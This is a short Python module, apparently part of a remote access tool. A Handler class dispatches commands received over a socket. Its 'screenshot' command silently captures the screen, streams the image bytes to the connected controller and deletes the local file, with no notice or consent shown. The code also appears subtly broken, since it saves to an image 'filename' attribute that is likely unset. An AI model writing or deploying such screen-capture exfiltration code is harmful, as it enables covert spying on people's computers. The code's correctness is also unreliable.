from io import BytesIO
import os, shutil
import pyscreeze


class Handler:
    def __init__(self):
        self.handler_obj = {
            'error':lambda conn:conn.send('[-]Unknown command'.encode()),
            'screenshot':self.command_screenshot
        }
    
    def command_screenshot(self, s):
        screenshot = pyscreeze.screenshot()
        screenshot.save(screenshot.filename)
        image_file_size = os.path.getsize(screenshot.filename)
        s.send(f'SIZE {image_file_size}'.encode())
        image_file = open(screenshot.filename,'rb')
        data = image_file.read(2048)
        while data:
            s.send(data)
            data = image_file.read(2048)
        os.unlink(screenshot.filename)
    
    
        
        
        



    def main(self, command_name):
        chosen = self.handler_obj.get(command_name) or self.handler_obj['error']
        return chosen
        